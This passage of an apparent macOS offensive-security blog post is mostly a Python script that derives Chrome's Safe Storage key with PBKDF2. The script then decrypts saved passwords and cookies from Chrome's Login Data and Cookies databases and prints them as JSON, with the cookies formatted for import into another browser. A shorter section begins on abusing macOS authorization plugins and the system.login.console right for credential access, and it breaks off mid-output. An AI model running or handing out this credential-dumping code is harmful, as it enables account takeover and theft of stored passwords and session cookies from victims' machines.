</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Strip padding by taking off number indicated by padding</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># eg if last is &#39;\x0e&#39; then ord(&#39;\x0e&#39;) == 14, so take off 14.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># You&#39;ll need to change this function to use ord() for python2.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">clean</span>(x):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> x[:<span style="color:#ff79c6">-</span>x[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(key, AES<span style="color:#ff79c6">.</span>MODE_CBC, IV<span style="color:#ff79c6">=</span>iv)
</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff79c6">=</span> cipher<span style="color:#ff79c6">.</span>decrypt(encrypted_value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> clean(decrypted)
</span></span><span style="display:flex;"><span>my_pass <span style="color:#ff79c6">=</span> chrome_secret<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf8&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#my_pass = my_pass.encode(&#39;utf8&#39;)</span>
</span></span><span style="display:flex;"><span>iterations <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1003</span>
</span></span><span style="display:flex;"><span>cookie_file <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>expanduser(cookie_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Generate key from values above</span>
</span></span><span style="display:flex;"><span>key <span style="color:#ff79c6">=</span> PBKDF2(my_pass, salt, length, iterations)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">diagnose_database</span>(db_path):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(db_path):
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The file </span><span style="color:#f1fa8c">{</span>db_path<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> does not exist.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(db_path)
</span></span><span style="display:flex;"><span>        cursor <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Check if the file is a valid SQLite database</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT sqlite_version();&#34;</span>)
</span></span><span style="display:flex;"><span>        version <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchone()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> version:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Valid SQLite database. Version: </span><span style="color:#f1fa8c">{</span>version[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;The file doesn&#39;t appear to be a valid SQLite database.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># List all tables in the database</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>        tables <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> tables:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Tables in the database:&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> table <span style="color:#ff79c6">in</span> tables:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;- </span><span style="color:#f1fa8c">{</span>table[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># Print schema for each table</span>
</span></span><span style="display:flex;"><span>                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;PRAGMA table_info(</span><span style="color:#f1fa8c">{</span>table[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">)&#34;</span>)
</span></span><span style="display:flex;"><span>                columns <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;  Columns:&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> column <span style="color:#ff79c6">in</span> columns:
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;    </span><span style="color:#f1fa8c">{</span>column[<span style="color:#bd93f9">1</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> (</span><span style="color:#f1fa8c">{</span>column[<span style="color:#bd93f9">2</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">)&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;No tables found in the database.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;SQLite error: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An unexpected error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">finally</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> conn:
</span></span><span style="display:flex;"><span>            conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> cookie_path <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        conn <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(cookie_file)
</span></span><span style="display:flex;"><span>        cursor <span style="color:#ff79c6">=</span> conn<span style="color:#ff79c6">.</span>cursor()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Check if the &#39;cookies&#39; table exists</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39; AND name=&#39;cookies&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> cursor<span style="color:#ff79c6">.</span>fetchone() <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The &#39;cookies&#39; table doesn&#39;t exist in the database: </span><span style="color:#f1fa8c">{</span>cookie_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Available tables:&#34;</span>)
</span></span><span style="display:flex;"><span>            cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT name FROM sqlite_master WHERE type=&#39;table&#39;;&#34;</span>)
</span></span><span style="display:flex;"><span>            tables <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> table <span style="color:#ff79c6">in</span> tables:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(table[<span style="color:#bd93f9">0</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>            sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;select name, value, encrypted_value, path, host_key, expires_utc, is_httponly, samesite, is_secure, priority, last_access_utc, is_persistent, has_expires, source_scheme from cookies&#39;</span>
</span></span><span style="display:flex;"><span>            cookies <span style="color:#ff79c6">=</span> {}
</span></span><span style="display:flex;"><span>            cookies_list <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> k, v, ev, path, domain, expirationDate, httpOnly, samesite, secure, priority, last_access, is_persistent, has_expires, source_scheme <span style="color:#ff79c6">in</span> conn<span style="color:#ff79c6">.</span>execute(sql):
</span></span><span style="display:flex;"><span>                    temp_val <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;name&#34;</span>: k, <span style="color:#f1fa8c">&#34;value&#34;</span>: v, <span style="color:#f1fa8c">&#34;path&#34;</span>: path, <span style="color:#f1fa8c">&#34;domain&#34;</span>: domain, <span style="color:#f1fa8c">&#34;expirationDate&#34;</span>: expirationDate, <span style="color:#f1fa8c">&#34;httpOnly&#34;</span>: httpOnly, <span style="color:#f1fa8c">&#34;samesite&#34;</span>: samesite, <span style="color:#f1fa8c">&#34;secure&#34;</span>: secure, <span style="color:#f1fa8c">&#34;id&#34;</span>: priority, <span style="color:#f1fa8c">&#34;session&#34;</span>: is_persistent, <span style="color:#f1fa8c">&#34;hostOnly&#34;</span>: <span style="color:#ff79c6">False</span>, <span style="color:#f1fa8c">&#34;storeId&#34;</span>:<span style="color:#f1fa8c">&#34;firefox-default&#34;</span>, <span style="color:#f1fa8c">&#34;sameSite&#34;</span>:<span style="color:#f1fa8c">&#34;no_restriction&#34;</span>,<span style="color:#f1fa8c">&#34;firstPartyDomain&#34;</span>:<span style="color:#f1fa8c">&#34;&#34;</span>}
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;httpOnly&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span> <span style="color:#ff79c6">if</span> httpOnly <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;secure&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span> <span style="color:#ff79c6">if</span> secure <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>                    temp_val[<span style="color:#f1fa8c">&#34;session&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">not</span> <span style="color:#8be9fd;font-style:italic">bool</span>(is_persistent)
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> v <span style="color:#ff79c6">or</span> (ev[:<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;v10&#39;</span>):
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">pass</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                        temp_val[<span style="color:#f1fa8c">&#39;value&#39;</span>] <span style="color:#ff79c6">=</span> chrome_decrypt(ev, key<span style="color:#ff79c6">=</span>key)
</span></span><span style="display:flex;"><span>                    cookies_list<span style="color:#ff79c6">.</span>append(temp_val)
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(json<span style="color:#ff79c6">.</span>dumps(cookies_list, sort_keys<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>, indent<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>OperationalError <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error executing SQL: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Columns in the &#39;cookies&#39; table:&#34;</span>)
</span></span><span style="display:flex;"><span>                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;PRAGMA table_info(cookies);&#34;</span>)
</span></span><span style="display:flex;"><span>                columns <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> column <span style="color:#ff79c6">in</span> columns:
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(column[<span style="color:#bd93f9">1</span>])  <span style="color:#6272a4"># Print column name</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> sqlite3<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;SQLite error: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An unexpected error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">finally</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> conn:
</span></span><span style="display:flex;"><span>            conn<span style="color:#ff79c6">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Cookie path is empty. Please provide a valid path.&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> login_data <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>    fd <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>open(login_data, os<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4">#open as read only</span>
</span></span><span style="display:flex;"><span>    database <span style="color:#ff79c6">=</span> sqlite3<span style="color:#ff79c6">.</span>connect(<span style="color:#f1fa8c">&#39;/dev/fd/</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> fd)
</span></span><span style="display:flex;"><span>    os<span style="color:#ff79c6">.</span>close(fd)
</span></span><span style="display:flex;"><span>    sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;select username_value, password_value, origin_url from logins&#39;</span>
</span></span><span style="display:flex;"><span>    decryptedList <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> database:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> user, encryptedPass, url <span style="color:#ff79c6">in</span> database<span style="color:#ff79c6">.</span>execute(sql):
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> user <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">or</span> (encryptedPass[:<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;v10&#39;</span>): <span style="color:#6272a4">#user will be empty if they have selected &#34;never&#34; store password</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Working on url: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(url))
</span></span><span style="display:flex;"><span>                urlUserPassDecrypted <span style="color:#ff79c6">=</span> (url, user, chrome_decrypt(encryptedPass, key<span style="color:#ff79c6">=</span>key))
</span></span><span style="display:flex;"><span>                decryptedList<span style="color:#ff79c6">.</span>append(urlUserPassDecrypted)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(json<span style="color:#ff79c6">.</span>dumps(decryptedList, sort_keys<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>, indent<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    cookie_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Cookies3&#34;</span>  <span style="color:#6272a4"># Update this to the correct path</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Diagnosing database: </span><span style="color:#f1fa8c">{</span>cookie_path<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    diagnose_database(cookie_path)
</span></span></code></pre></div><h1 id="credential-access-via-authorization-plugins">credential access via authorization plugins</h1>
<p>authorization plugins (located in <code>/Library/Security/SecurityAgentPlugins</code>) extend the authentication system in macOS by allowing custom authentication methods to be integrated into the standard login process. <code>securityd</code> works with these plugins to handle authentication requests, by communicating with <code>SecurityAgent</code>, which loads + uses these plugins.</p>
<p>the plugins can implement custom authentication methods (biometric, 3rd-party IdPs) and so must be carefully designed and implemented.</p>
<p>the authorization database (located at <code>/var/db/auth.db</code>) controls all the rules, policies, and plugins that are used when requests are processed via <code>securityd</code>. you can dump the information in this database by providing a &ldquo;right-name&rdquo; (check out the full list <a href="https://www.dssw.co.uk/reference/authorization-rights/"  target="_blank" rel="noreferrer nofollow">here</a>
): <code>security authorizationdb read &lt;right-name&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> allow
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;allow&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Allow anyone.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;0&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> authenticate-session-owner-or-admin
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;allow-root&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;false/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;authenticate-user&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;user&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Authenticate either as the owner or as an administrator.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;group&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;admin&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;session-owner&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;false/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;timeout&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;2147483647&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;0&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>these are known as authorization rights. as you can see, they have a <code>class</code> key that has three possible values: <code>user</code>, <code>rule</code>, <code>evaluate-mechanisms</code>. the latter is a complex series of programmatic checks.</p>
<p>an important right that i&rsquo;ll look at is <code>system.login.console</code>. this controls access to console login on macOS. the <code>loginwindow</code> process tries to obtain this right during the login process, and sysadmins usually modify this right to add custom authC/authZ steps during login. it&rsquo;s structured as a <code>plist</code> containing various keys, and modifying it can yield some pretty powerful effects.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ security authorizationdb <span style="color:#8be9fd;font-style:italic">read</span> system.login.console               
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC <span style="color:#f1fa8c">&#34;-//Apple//DTD PLIST 1.0//EN&#34;</span> <span style="color:#f1fa8c">&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;plist <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Login mechanism based rule.  Not <span style="color:#ff79c6">for</span> general use, yet.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;mechanisms&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;array&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:prelogin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:policy-banner&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-begin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:reset-password,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:FDESupport,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:forward-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:auto-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:authenticate,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;PKINITMechanism:auth,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-success&lt;/string&gt;
